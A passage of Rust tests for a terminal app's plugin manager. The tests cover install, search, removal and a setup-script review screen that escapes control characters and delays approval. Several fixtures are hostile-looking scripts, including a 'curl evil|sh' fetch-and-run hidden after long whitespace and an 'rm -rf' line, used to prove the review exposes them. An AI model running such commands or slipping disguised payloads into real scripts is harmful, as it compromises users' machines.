        assert!(a.modal.is_none());
        let flash = |a: &App| a.flash.as_ref().map(|(m, _)| m.clone()).unwrap_or_default();
        settle(&mut a, |a| flash(a).contains("started"));
        assert_eq!(flash(&a), "good: started start");
        // no actions: a hint, no menu
        select(&mut a, "plugin:bad");
        key(&mut a, KeyCode::Char('a'));
        assert!(a.modal.is_none());
    }

    #[cfg(unix)]
    #[test]
    fn p_adds_a_plugin_from_a_folder_and_refuses_a_second_time() {
        let mut a = app();
        let src = plugin_script(&a, "x", GOOD);
        let src2 = a.paths.home.join("src/mine");
        fs::create_dir_all(src2.parent().unwrap()).unwrap();
        fs::rename(&src, &src2).unwrap();
        for want in ["Installed plugin mine", "already"] {
            key(&mut a, KeyCode::Char('p'));
            a.on_paste(&src2.to_string_lossy());
            key(&mut a, KeyCode::Enter);
            key(&mut a, KeyCode::Enter);
            assert!(a.modal.is_none(), "the add runs in the background");
            settle(&mut a, |a| flash(a).contains(want));
            assert!(flash(&a).contains(want), "{}", flash(&a));
            key(&mut a, KeyCode::Esc);
        }
        assert!(a.paths.plugins.join("mine/plugin").is_file());
        assert!(
            ids(&a).iter().any(|i| i.starts_with("plugin:mine")),
            "its section shows at once"
        );
    }

    #[cfg(unix)]
    #[test]
    fn plugin_sections_draw_with_a_clickable_pill() {
        use ratatui::{Terminal, backend::TestBackend};
        let mut a = plugin_app();
        settle(&mut a, |a| a.plugins.iter().all(|p| !p.loading));
        for (w, h) in [(20, 5), (40, 10), (120, 40)] {
            let mut t = Terminal::new(TestBackend::new(w, h)).unwrap();
            let mut hits = Hits::default();
            t.draw(|f| hits = crate::ui::draw(f, &a)).unwrap();
            if w == 120 {
                let text: String = t
                    .backend()
                    .buffer()
                    .content()
                    .iter()
                    .map(|c| c.symbol())
                    .collect();
                for want in [
                    "GOOD",
                    "Alpha",
                    "ready",
                    "detail one",
                    "offp · off",
                    "bad: plugin failed",
                ] {
                    assert!(text.contains(want), "{want}");
                }
                let names: Vec<&str> = hits.plugins.iter().map(|(_, n)| n.as_str()).collect();
                assert_eq!(names, ["bad", "good", "offp", "slow"]);
            }
        }
    }

    // ── plugins screen ────────────────────────────────────

    /// The screen as text lines at `w` columns, and where things were drawn.
    fn screen_at(a: &App, w: u16) -> (Vec<String>, Hits) {
        use ratatui::{Terminal, backend::TestBackend};
        let mut t = Terminal::new(TestBackend::new(w, 40)).unwrap();
        let mut hits = Hits::default();
        t.draw(|f| hits = crate::ui::draw(f, a)).unwrap();
        let b = t.backend().buffer();
        let lines = (0..b.area.height)
            .map(|y| (0..b.area.width).map(|x| b[(x, y)].symbol()).collect())
            .collect();
        (lines, hits)
    }

    fn screen(a: &App) -> (Vec<String>, Hits) {
        screen_at(a, 110)
    }

    fn line_with(lines: &[String], text: &str) -> String {
        lines
            .iter()
            .find(|l| l.contains(text))
            .cloned()
            .unwrap_or_else(|| panic!("no line with {text}:\n{}", lines.join("\n")))
    }

    fn line_no(lines: &[String], text: &str) -> usize {
        lines
            .iter()
            .position(|l| l.contains(text))
            .unwrap_or_else(|| panic!("no line with {text}:\n{}", lines.join("\n")))
    }

    fn flash(a: &App) -> String {
        a.flash.as_ref().map(|(m, _)| m.clone()).unwrap_or_default()
    }

    /// Opens the screen and puts the cursor on installed plugin `name`.
    fn pwin_select(a: &mut App, name: &str) {
        if a.plugins_win.is_none() {
            a.focus = Focus::Home;
            key(a, KeyCode::Char('P'));
        }
        let i = a.plugins.iter().position(|s| s.plugin.name == name);
        let at = a
            .plugins_items()
            .iter()
            .position(|it| Some(*it) == i.map(Item::Installed))
            .unwrap_or_else(|| panic!("no plugin {name}"));
        a.plugins_win.as_mut().unwrap().sel = at;
    }

    fn names_of(a: &App) -> Vec<String> {
        a.plugins_items()
            .iter()
            .map(|it| match it {
                Item::Installed(i) => a.plugins[*i].plugin.name.clone(),
                Item::Available(i) => format!("+{}", a.available[*i].name),
                Item::AddButton => "add".into(),
            })
            .collect()
    }

    #[cfg(unix)]
    #[test]
    fn plugins_screen_lists_installed_then_available_then_add() {
        let mut a = plugin_app();
        let git = plugin_script(&a, "gitp", GOOD);
        fs::write(
            git.join(".source"),
            "https://me:secret@example.com/x/gitp.git\n",
        )
        .unwrap();
        fs::create_dir_all(git.join(".git")).unwrap();
        fs::write(a.paths.plugins.join("good/about"), "Team gateway\n").unwrap();
        a.refresh();
        a.reload_plugins();
        settle(&mut a, |a| a.plugins.iter().all(|p| !p.loading));
        // P and the home button open it; q and esc close it, never the app
        a.on_key(KeyEvent::new(KeyCode::Char('P'), KeyModifiers::SHIFT));
        assert!(a.plugins_win.is_some());
        key(&mut a, KeyCode::Char('q'));
        assert!(a.plugins_win.is_none() && !a.quit);
        let (_, hits) = screen(&a);
        let b = hits
            .buttons
            .iter()
            .find(|(_, b)| *b == Button::Plugins)
            .unwrap()
            .0;
        click(&mut a, &hits, b.x, b.y);
        assert!(a.plugins_win.as_ref().is_some_and(|w| w.form.is_none()));
        assert_eq!(
            names_of(&a),
            ["bad", "gitp", "good", "offp", "slow", "+cliproxy", "add"]
        );
        for w in [80, 120] {
            let (lines, _) = screen_at(&a, w);
            line_with(&lines, "5 installed · 1 available");
            line_with(&lines, "search:");
            let order = [
                "INSTALLED",
                " bad ",
                " good ",
                "AVAILABLE · bundled",
                " cliproxy ",
                "[+ Add from git / folder]",
            ]
            .map(|t| line_no(&lines, t));
            assert!(order.windows(2).all(|p| p[0] < p[1]), "{order:?}");
            for (name, want) in [
                ("good", ["Team gateway", "● ok", "● on", "actions", "[-]"]),
                ("bad", ["bad", "× failed", "● on", "[-]", "[-]"]),
                ("offp", ["offp", "·", "○ off", "[-]", "[-]"]),
                ("gitp", ["gitp", "● ok", "● on", "↻ update", "[-]"]),
            ] {
                let l = line_with(&lines, &format!(" {name} "));
                for t in want {
                    assert!(l.contains(t), "{name} at {w}: {t} not in {l}");
                }
            }
            assert!(!line_with(&lines, " good ").contains("update"));
            assert!(line_with(&lines, " cliproxy ").contains("[+]"));
            line_with(&lines, " back");
            assert!(!lines.iter().any(|l| l.contains("secret")));
            assert!(!lines.iter().any(|l| l.contains('⚙')));
        }
        // a click on a row selects it, on [+ Add] opens the form inside the screen
        let (_, hits) = screen(&a);
        let (row, i) = hits.plugin_rows[2];
        click(&mut a, &hits, row.x, row.y);
        assert_eq!(a.plugins_win.as_ref().unwrap().sel, i);
        let add = hits
            .plugin_btns
            .iter()
            .find(|(_, it, _)| *it == names_of(&a).len() - 1)
            .unwrap()
            .0;
        click(&mut a, &hits, add.x, add.y);
        assert!(a.plugins_win.as_ref().unwrap().form.is_some());
        assert!(a.modal.is_none(), "the form is in the screen, not a window");
    }

    #[cfg(unix)]
    #[test]
    fn search_filters_both_lists_by_name_and_about() {
        let mut a = plugin_app();
        fs::write(a.paths.plugins.join("good/about"), "Team Gateway\n").unwrap();
        a.refresh();
        key(&mut a, KeyCode::Char('P'));
        key(&mut a, KeyCode::Char('/'));
        // q and j are text while searching
        typed(&mut a, "gateway");
        assert_eq!(names_of(&a), ["good", "add"]);
        assert!(a.plugins_win.is_some());
        let (lines, _) = screen(&a);
        line_with(&lines, "search: gateway");
        for _ in 0.."gateway".len() {
            key(&mut a, KeyCode::Backspace);
        }
        typed(&mut a, "PROXY");
        assert_eq!(names_of(&a), ["+cliproxy", "add"]);
        key(&mut a, KeyCode::Enter);
        assert!(!a.plugins_win.as_ref().unwrap().searching);
        assert_eq!(a.plugins_win.as_ref().unwrap().search, "PROXY");
        key(&mut a, KeyCode::Char('/'));
        key(&mut a, KeyCode::Backspace);
        typed(&mut a, "q");
        assert_eq!(names_of(&a), ["add"]);
        assert!(a.plugins_win.is_some() && !a.quit);
    }

    #[cfg(unix)]
    #[test]
    fn esc_closes_form_then_search_then_screen() {
        let mut a = plugin_app();
        let w = |a: &App| {
            a.plugins_win
                .as_ref()
                .map(|w| (w.form.is_some(), w.search.clone(), w.searching))
        };
        key(&mut a, KeyCode::Char('P'));
        key(&mut a, KeyCode::Char('/'));
        typed(&mut a, "go");
        key(&mut a, KeyCode::Enter);
        key(&mut a, KeyCode::Char('+'));
        assert_eq!(w(&a), Some((true, "go".into(), false)));
        key(&mut a, KeyCode::Esc);
        assert_eq!(w(&a), Some((false, "go".into(), false)));
        key(&mut a, KeyCode::Esc);
        assert_eq!(w(&a), Some((false, "".into(), false)));
        key(&mut a, KeyCode::Esc);
        assert_eq!(w(&a), None);
        // while searching: esc clears the text, then leaves search, then closes
        key(&mut a, KeyCode::Char('P'));
        key(&mut a, KeyCode::Char('/'));
        typed(&mut a, "go");
        key(&mut a, KeyCode::Esc);
        assert_eq!(w(&a), Some((false, "".into(), true)));
        key(&mut a, KeyCode::Esc);
        assert_eq!(w(&a), Some((false, "".into(), false)));
        key(&mut a, KeyCode::Esc);
        assert_eq!(w(&a), None);
        // home's p opens the screen with the form open
        key(&mut a, KeyCode::Char('p'));
        assert_eq!(w(&a), Some((true, "".into(), false)));
    }

    #[cfg(unix)]
    #[test]
    fn minus_asks_then_removes() {
        let mut a = plugin_app();
        pwin_select(&mut a, "bad");
        key(&mut a, KeyCode::Char('u'));
        assert!(
            flash(&a).contains("not installed from git"),
            "{}",
            flash(&a)
        );
        key(&mut a, KeyCode::Char('-'));
        let Some(Modal::Confirm(c)) = &a.modal else {
            panic!("no confirm")
        };
        assert_eq!(c.id, "plugin:bad");
        key(&mut a, KeyCode::Char('n'));
        assert!(a.paths.plugins.join("bad").exists());
        // the [-] on its row asks too
        let (_, hits) = screen(&a);
        let sel = a.plugins_win.as_ref().unwrap().sel;
        let minus = hits
            .plugin_btns
            .iter()
            .find(|(_, it, k)| *it == sel && *k == KeyCode::Char('-'))
            .unwrap()
            .0;
        click(&mut a, &hits, minus.x, minus.y);
        assert!(matches!(&a.modal, Some(Modal::Confirm(c)) if c.id == "plugin:bad"));
        key(&mut a, KeyCode::Char('y'));
        assert!(!a.paths.plugins.join("bad").exists());
        assert!(a.plugins.iter().all(|s| s.plugin.name != "bad"));
        assert!(a.plugins_win.is_some(), "back in the screen");
        screen(&a);
    }

    #[cfg(unix)]
    #[test]
    fn plus_on_available_with_setup_opens_review() {
        let mut a = plugin_app();
        key(&mut a, KeyCode::Char('P'));
        let at = names_of(&a).iter().position(|n| n == "+cliproxy").unwrap();
        assert!(a.available[0].has_setup);
        let (_, hits) = screen(&a);
        let plus = hits
            .plugin_btns
            .iter()
            .find(|(_, it, k)| *it == at && *k == KeyCode::Char('+'))
            .unwrap()
            .0;
        click(&mut a, &hits, plus.x, plus.y);
        let done = |a: &App| flash(a).contains("Installed") || review(a).is_some();
        settle(&mut a, done);
        assert!(review(&a).is_some(), "{}", flash(&a));
        // staged only: nothing installed until the review is approved
        assert!(!a.paths.plugins.join("cliproxy/plugin").exists());
        assert!(a.paths.plugins.join(".cliproxy.install/setup").is_file());
        {
            use std::os::unix::fs::PermissionsExt;
            let m = fs::metadata(a.paths.plugins.join(".cliproxy.install/setup")).unwrap();
            assert_eq!(m.permissions().mode() & 0o111, 0o111);
        }
        assert!(a.plugins_win.is_some());
    }

    #[cfg(unix)]
    #[test]
    fn plus_on_installed_opens_add_form() {
        let mut a = plugin_app();
        let src = plugin_script(&a, "x", GOOD);
        let src2 = a.paths.home.join("src/mine");
        fs::create_dir_all(src2.parent().unwrap()).unwrap();
        fs::rename(&src, &src2).unwrap();
        fs::write(src2.join("setup"), "#!/bin/sh\n").unwrap();
        let withsetup = a.paths.home.join("src/withsetup");
        crate::failover::copy_dir(&src2, &withsetup).unwrap();
        fs::remove_file(src2.join("setup")).unwrap();
        a.refresh();
        pwin_select(&mut a, "good");
        for (src, want) in [(&src2, "Installed plugin mine"), (&withsetup, "review")] {
            key(&mut a, KeyCode::Char('+'));
            assert!(a.plugins_win.as_ref().unwrap().form.is_some());
            a.on_paste(&src.to_string_lossy());
            key(&mut a, KeyCode::Enter);
            key(&mut a, KeyCode::Enter);
            assert!(a.plugins_win.as_ref().unwrap().form.is_none());
            if want == "review" {
                settle(&mut a, |a| review(a).is_some());
                assert!(review(&a).is_some(), "{}", flash(&a));
                key(&mut a, KeyCode::Esc);
            } else {
                settle(&mut a, |a| flash(a).contains(want));
                assert!(flash(&a).contains(want), "{}", flash(&a));
            }
            pwin_select(&mut a, "good");
        }
        assert!(a.paths.plugins.join("mine/plugin").is_file());
        assert!(!a.paths.plugins.join("withsetup").exists());
        assert!(!a.paths.plugins.join(".withsetup.install").exists());
    }

    #[cfg(unix)]
    #[test]
    fn space_toggles_off_file() {
        let mut a = plugin_app();
        let off = a.paths.plugins.join("good/.off");
        pwin_select(&mut a, "good");
        key(&mut a, KeyCode::Char(' '));
        assert!(off.exists());
        key(&mut a, KeyCode::Char('o'));
        assert!(!off.exists());
        key(&mut a, KeyCode::Down);
        assert_eq!(names_of(&a)[a.plugins_win.as_ref().unwrap().sel], "offp");
        // a click on good's pill toggles it and selects it
        let (_, hits) = screen(&a);
        let at = names_of(&a).iter().position(|n| n == "good").unwrap();
        let pill = hits
            .plugin_btns
            .iter()
            .find(|(_, it, k)| *it == at && *k == KeyCode::Char(' '))
            .unwrap()
            .0;
        click(&mut a, &hits, pill.x, pill.y);
        assert_eq!(a.plugins_win.as_ref().unwrap().sel, at);
        assert!(off.exists());
    }

    #[test]
    fn home_button_has_no_emoji() {
        let mut a = app();
        let allowed = |c: char| c.is_ascii_alphanumeric() || " +-✻●○↻✎×›·▌".contains(c);
        for wrr in [false, true] {
            a.wrr = wrr;
            let labels = crate::ui::home_buttons(&a);
            assert!(labels.contains(&(" Plugins ", Button::Plugins)));
            for (l, _) in labels {
                assert!(l.chars().all(allowed), "{l}");
            }
        }
    }

    #[cfg(unix)]
    #[test]
    fn available_empty_says_no_other_bundled_plugins() {
        let mut a = plugin_app();
        let s = plugins::stage(&a.paths, "cliproxy").unwrap();
        plugins::commit(&a.paths, &s).unwrap();
        a.refresh();
        key(&mut a, KeyCode::Char('P'));
        assert!(a.available.is_empty());
        let (lines, _) = screen(&a);
        line_with(&lines, "no other bundled plugins");
        line_with(&lines, "5 installed · 0 available");
        // bundled source shows nowhere secret; + on the add button opens the form
        let n = names_of(&a).len();
        a.plugins_win.as_mut().unwrap().sel = n - 1;
        key(&mut a, KeyCode::Char('+'));
        assert!(a.plugins_win.as_ref().unwrap().form.is_some());
    }

    // ── setup review and setup tab ────────────────────────

    /// A plugin source folder `<home>/src/<name>` with `plugin` (GOOD) and `setup` = `setup`.
    #[cfg(unix)]
    fn setup_src(a: &App, name: &str, setup: &str) -> PathBuf {
        let d = plugin_script(a, name, GOOD);
        fs::write(d.join("setup"), setup).unwrap();
        let src = a.paths.home.join("src").join(name);
        fs::create_dir_all(src.parent().unwrap()).unwrap();
        fs::rename(&d, &src).unwrap();
        src
    }

    fn review(a: &App) -> Option<&Review> {
        a.plugins_win.as_ref().and_then(|w| w.review.as_ref())
    }

    /// Installs `src` from the Plugins screen and waits for its review to open.
    #[cfg(unix)]
    fn staged_for_review(a: &mut App, src: &std::path::Path) {
        if a.plugins_win.is_none() {
            a.focus = Focus::Home;
            key(a, KeyCode::Char('P'));
        }
        a.install(src.to_string_lossy().into_owned());
        settle(a, |a| review(a).is_some());
        assert!(review(a).is_some(), "{}", flash(a));
        ready(a);
    }

    /// Draws the open review once (it records its size) and moves it past `APPROVE_DELAY`.
    fn ready(a: &mut App) {
        screen(a);
        if let Some(r) = a.plugins_win.as_mut().and_then(|w| w.review.as_mut()) {
            r.opened = Instant::now() - APPROVE_DELAY - Duration::from_millis(10);
        }
    }

    fn tab_text(a: &App, t: usize) -> String {
        a.tabs[t].pane.as_ref().map_or(String::new(), |p| {
            p.screen.lock().unwrap().screen().contents()
        })
    }

    #[cfg(unix)]
    #[test]
    fn plus_on_setup_plugin_opens_review_and_installs_nothing_yet() {
        let mut a = plugin_app();
        let src = setup_src(&a, "mine", "#!/bin/sh\nset -e\necho hi\n");
        staged_for_review(&mut a, &src);
        let staging = a.paths.plugins.join(".mine.install");
        assert!(staging.join("plugin").is_file());
        assert!(
            !a.paths.plugins.join("mine").exists(),
            "nothing installed yet"
        );
        let (lines, hits) = screen(&a);
        line_with(&lines, "Plugins › install mine");
        let head = line_with(&lines, "SETUP SCRIPT · review before running");
        assert!(head.contains("setup · 3 lines"), "{head}");
        line_with(&lines, "1  #!/bin/sh");
        line_with(&lines, "3  echo hi");
        line_with(
            &lines,
            "Runs in a terminal tab as you. The plugin is installed only if setup succeeds.",
        );
        line_with(
            &lines,
            "The plugin's own code also runs with your permissions: install only plugins you trust.",
        );
        let buttons = line_with(&lines, "[ Approve and install ]");
        assert!(buttons.contains("[ Cancel ]"), "{buttons}");
        let foot = line_with(&lines, "approve");
        assert!(foot.contains("PgUp PgDn") && foot.contains("scroll") && foot.contains("cancel"));
        assert!(hits.plugin_btns.iter().any(|b| b.2 == KeyCode::Enter));
        // a second install of the same name is ignored while this one is in review
        a.install(src.to_string_lossy().into_owned());
        assert!(
            flash(&a).contains("mine is already being installed"),
            "{}",
            flash(&a)
        );
        std::thread::sleep(Duration::from_millis(200));
        a.tick();
        assert!(staging.join("plugin").is_file(), "the live staging stays");
        assert!(review(&a).is_some());
    }

    #[cfg(unix)]
    #[test]
    fn review_cancel_aborts_staging() {
        let mut a = plugin_app();
        let src = setup_src(&a, "mine", "echo hi\n");
        staged_for_review(&mut a, &src);
        let staging = a.paths.plugins.join(".mine.install");
        key(&mut a, KeyCode::Esc);
        assert!(review(&a).is_none() && a.plugins_win.is_some());
        assert!(!staging.exists());
        assert!(!a.paths.plugins.join("mine").exists());
        assert_eq!(flash(&a), "cancelled: plugin not installed");
        // the [ Cancel ] button does the same, and the name is free again
        staged_for_review(&mut a, &src);
        let (_, hits) = screen(&a);
        let cancel = hits
            .plugin_btns
            .iter()
            .find(|b| b.2 == KeyCode::Esc)
            .unwrap()
            .0;
        click(&mut a, &hits, cancel.x, cancel.y);
        assert!(review(&a).is_none());
        assert!(!staging.exists());
        assert!(a.tabs.is_empty());
    }

    #[cfg(unix)]
    #[test]
    fn review_shows_control_bytes_escaped() {
        let mut a = plugin_app();
        let src = setup_src(
            &a,
            "mine",
            "echo \x1b[31mred\x07\r\necho \u{202e}evil\u{9b}\n",
        );
        staged_for_review(&mut a, &src);
        let (lines, _) = screen(&a);
        line_with(&lines, "echo ^[[31mred^G^M");
        line_with(&lines, "echo <U+202E>evil<M-^[>");
        // invisible and blank-looking characters, each shown by its code
        let odd = [
            '\u{ad}',
            '\u{34f}',
            '\u{115f}',
            '\u{1160}',
            '\u{3164}',
            '\u{ffa0}',
            '\u{fe0f}',
            '\u{e0041}',
            '\u{a0}',
            '\u{2003}',
            '\u{3000}',
            '\u{fffa}',
        ];
        for c in odd {
            let shown = crate::ui::escape_line(&format!("a{c}b"));
            assert_eq!(shown, format!("a<U+{:04X}>b", c as u32));
        }
        assert_eq!(crate::ui::escape_line("héllo 日本 -x"), "héllo 日本 -x");
        let all = lines.concat();
        assert!(
            !all.chars().any(|c| c.is_control() || c == '\u{202e}'),
            "raw control chars reached the screen"
        );
        // a long line wraps instead of hiding its end past the edge
        let long = format!("echo {}; rm -rf /tmp/nothing\n", "x".repeat(200));
        let src2 = setup_src(&a, "longp", &long);
        key(&mut a, KeyCode::Esc);
        staged_for_review(&mut a, &src2);
        let (lines, _) = screen(&a);
        line_with(&lines, "rm -rf /tmp/nothing");
    }

    #[cfg(unix)]
    #[test]
    fn approve_opens_setup_tab_in_staging() {
        let mut a = plugin_app();
        let src = setup_src(
            &a,
            "mine",
            "echo \"dir=$AI_PLUGIN_DIR\"\necho \"pwd=$(pwd -P)\"\nsleep 30\n",
        );
        staged_for_review(&mut a, &src);
        let staging = a.paths.plugins.join(".mine.install");
        key(&mut a, KeyCode::Enter);
        assert!(a.plugins_win.is_none(), "the tab shows");
        assert_eq!(a.tabs.len(), 1);
        assert_eq!(a.tabs[0].member, "setup:mine");
        assert!(a.in_tab());
        let real = staging.canonicalize().unwrap();
        settle(&mut a, |a| tab_text(a, 0).contains("pwd="));
        let text = tab_text(&a, 0).replace('\n', "");
        assert!(
            text.contains(&format!("dir={}", staging.display())),
            "{text}"
        );
        assert!(text.contains(&format!("pwd={}", real.display())), "{text}");
        assert!(
            !a.paths.plugins.join("mine").exists(),
            "not installed while it runs"
        );
        assert!(staging.exists());
        // a second install while it runs is ignored
        a.install(src.to_string_lossy().into_owned());
        assert!(flash(&a).contains("already being installed"));
    }

    #[cfg(unix)]
    #[test]
    fn setup_exit_zero_commits() {
        let mut a = plugin_app();
        let src = setup_src(&a, "mine", "echo ok > \"$AI_PLUGIN_DIR/did\"\nexit 0\n");
        staged_for_review(&mut a, &src);
        let staging = a.paths.plugins.join(".mine.install");
        // what runs is the text reviewed, not the file read again
        fs::write(staging.join("setup"), "exit 9\n").unwrap();
        key(&mut a, KeyCode::Enter);
        let copy = a.setups[0].copy.clone();
        assert!(copy.is_file());
        settle(&mut a, |a| flash(a).contains("installed plugin mine"));
        assert_eq!(flash(&a), "installed plugin mine");
        let dest = a.paths.plugins.join("mine");
        assert!(dest.join("plugin").is_file() && dest.join("did").is_file());
        assert!(!staging.exists());
        assert!(!copy.exists(), "the temp copy is removed");
        assert!(a.setups.is_empty());
        assert!(a.plugins.iter().any(|s| s.plugin.name == "mine"));
        // enter on the ended setup tab closes it (nothing to start again)
        key(&mut a, KeyCode::Enter);
        assert!(a.tabs.is_empty());
    }

    #[cfg(unix)]
    #[test]
    fn setup_exit_nonzero_aborts() {
        let mut a = plugin_app();
        let src = setup_src(&a, "mine", "exit 4\n");
        staged_for_review(&mut a, &src);
        key(&mut a, KeyCode::Enter);
        let copy = a.setups[0].copy.clone();
        settle(&mut a, |a| flash(a).contains("setup failed"));
        assert_eq!(flash(&a), "setup failed (exit 4): plugin not installed");
        assert!(!a.paths.plugins.join(".mine.install").exists());
        assert!(!a.paths.plugins.join("mine").exists());
        assert!(!copy.exists());
        // the name is free again
        staged_for_review(&mut a, &src);
    }

    #[cfg(unix)]
    #[test]
    fn closing_setup_tab_aborts() {
        let mut a = plugin_app();
        let src = setup_src(&a, "mine", "sleep 30\n");
        staged_for_review(&mut a, &src);
        key(&mut a, KeyCode::Enter);
        let copy = a.setups[0].copy.clone();
        a.focus = Focus::Home;
        key(&mut a, KeyCode::Char('x'));
        assert!(a.tabs.is_empty());
        a.tick();
        assert_eq!(flash(&a), "setup failed (tab closed): plugin not installed");
        assert!(!a.paths.plugins.join(".mine.install").exists());
        assert!(!a.paths.plugins.join("mine").exists());
        assert!(!copy.exists());
        assert!(a.setups.is_empty());
    }

    #[cfg(unix)]
    #[test]
    fn rerun_backs_up_config_and_keeps_plugin_on_failure() {
        let mut a = plugin_app();
        // no setup script: s says so
        pwin_select(&mut a, "good");
        key(&mut a, KeyCode::Char('s'));
        assert_eq!(flash(&a), "no setup script");
        assert!(review(&a).is_none());
        let dir = a.paths.plugins.join("good");
        fs::write(dir.join("config"), "k=v\n").unwrap();
        fs::write(dir.join("setup"), "echo x > config\nexit 3\n").unwrap();
        key(&mut a, KeyCode::Char('s'));
        let (lines, _) = screen(&a);
        line_with(&lines, "[ Approve and run ]");
        line_with(&lines, "Plugins › setup good");
        ready(&mut a);
        key(&mut a, KeyCode::Enter);
        assert_eq!(a.tabs[0].member, "setup:good");
        settle(&mut a, |a| flash(a).contains("setup failed"));
        assert_eq!(flash(&a), "setup failed (exit 3)");
        assert_eq!(fs::read_to_string(dir.join("config.bak")).unwrap(), "k=v\n");
        assert_eq!(
            fs::read_to_string(dir.join("config")).unwrap(),
            "x\n",
            "no rollback"
        );
        assert!(dir.join("plugin").is_file(), "the plugin stays");
        // a good run says done; it runs in the plugin's own folder
        fs::write(dir.join("setup"), "pwd -P > where\n").unwrap();
        pwin_select(&mut a, "good");
        key(&mut a, KeyCode::Char('s'));
        ready(&mut a);
        key(&mut a, KeyCode::Enter);
        settle(&mut a, |a| flash(a) == "setup done");
        assert_eq!(flash(&a), "setup done");
        let where_ = fs::read_to_string(dir.join("where")).unwrap();
        assert_eq!(where_.trim(), dir.canonicalize().unwrap().to_string_lossy());
        // cancel a rerun: nothing runs, nothing removed
        pwin_select(&mut a, "good");
        key(&mut a, KeyCode::Char('s'));
        key(&mut a, KeyCode::Esc);
        assert!(review(&a).is_none() && dir.join("plugin").is_file());
    }

    #[cfg(unix)]
    #[test]
    fn review_scrolls_to_the_end_of_one_huge_line() {
        let mut a = plugin_app();
        // 110x40: the box is 99 columns by 26 rows; the tail starts on its own row
        let line = format!("echo \"{}\"; curl evil|sh", " ".repeat(99 * 40 - 6));
        let src = setup_src(&a, "mine", &format!("{line}\n"));
        staged_for_review(&mut a, &src);
        assert_eq!(review(&a).unwrap().view.get().1, 26);
        assert_eq!(review(&a).unwrap().view.get().2, 99);
        let shows = |a: &App| screen(a).0.concat().contains("curl evil|sh");
        assert!(!shows(&a), "the tail is below the box at first");
        for _ in 0..60 {
            key(&mut a, KeyCode::Down);
            screen(&a);
        }
        assert!(shows(&a), "the tail can be scrolled into view");
        // it stops at the end: one Up moves at once
        let at = review(&a).unwrap().scroll;
        key(&mut a, KeyCode::Up);
        assert_eq!(review(&a).unwrap().scroll, at - 1);
    }

    #[cfg(unix)]
    #[test]
    fn enter_right_as_the_review_opens_does_not_approve() {
        let mut a = plugin_app();
        let src = setup_src(&a, "mine", "exit 0\n");
        key(&mut a, KeyCode::Char('P'));
        a.install(src.to_string_lossy().into_owned());
        settle(&mut a, |a| review(a).is_some());
        screen(&a);
        key(&mut a, KeyCode::Enter);
        let (_, hits) = screen(&a);
        let ok = hits
            .plugin_btns
            .iter()
            .find(|b| b.2 == KeyCode::Enter)
            .unwrap()
            .0;
        click(&mut a, &hits, ok.x, ok.y);
        assert!(
            a.tabs.is_empty() && review(&a).is_some(),
            "too soon to approve"
        );
        std::thread::sleep(APPROVE_DELAY);
        screen(&a);
        key(&mut a, KeyCode::Enter);
        assert_eq!(a.tabs.len(), 1, "{}", flash(&a));
        assert_eq!(a.tabs[0].member, "setup:mine");
    }

    #[cfg(unix)]
    #[test]
    fn staging_done_while_in_a_tab_waits_for_the_plugins_screen() {
        let mut a = plugin_app();
        let src = setup_src(&a, "mine", "exit 0\n");
        a.install(src.to_string_lossy().into_owned());
        a.open("t1");
        assert!(a.in_tab());
        settle(&mut a, |a| flash(a).contains("ready to review"));
        assert_eq!(flash(&a), "mine ready to review: open Plugins");
        assert!(a.plugins_win.is_none(), "no review over the tab");
        key(&mut a, KeyCode::Enter);
        assert!(
            a.setups.is_empty() && a.plugins_win.is_none(),
            "keys stay the tab's"
        );
        assert!(a.paths.plugins.join(".mine.install").exists());
        // still busy while it waits
        a.install(src.to_string_lossy().into_owned());
        assert!(flash(&a).contains("already being installed"));
        a.focus = Focus::Home;
        key(&mut a, KeyCode::Char('P'));
        assert!(review(&a).is_some_and(|r| r.target.name() == "mine"));
    }

    #[cfg(unix)]
    #[test]
    fn tiny_window_refuses_approval() {
        let mut a = plugin_app();
        let src = setup_src(&a, "mine", "exit 0\n");
        staged_for_review(&mut a, &src);
        screen_at(&a, 8);
        key(&mut a, KeyCode::Enter);
        assert_eq!(flash(&a), "window too small to review");
        assert!(a.tabs.is_empty() && review(&a).is_some());
        screen(&a);
        key(&mut a, KeyCode::Enter);
        assert_eq!(a.tabs.len(), 1);
    }

    #[cfg(unix)]
    #[test]
    fn minus_refuses_while_busy() {
        let mut a = plugin_app();
        let dir = a.paths.plugins.join("good");
        fs::write(dir.join("setup"), "sleep 30\n").unwrap();
        pwin_select(&mut a, "good");
        // a setup running in its folder
        key(&mut a, KeyCode::Char('s'));
        ready(&mut a);
        key(&mut a, KeyCode::Enter);
        assert_eq!(a.tabs.len(), 1);
        pwin_select(&mut a, "good");
        key(&mut a, KeyCode::Char('-'));
        assert!(a.modal.is_none(), "no delete while its setup runs");
        assert_eq!(flash(&a), "good is busy: remove it after its setup ends.");
        assert!(dir.join("plugin").is_file());
    }
}
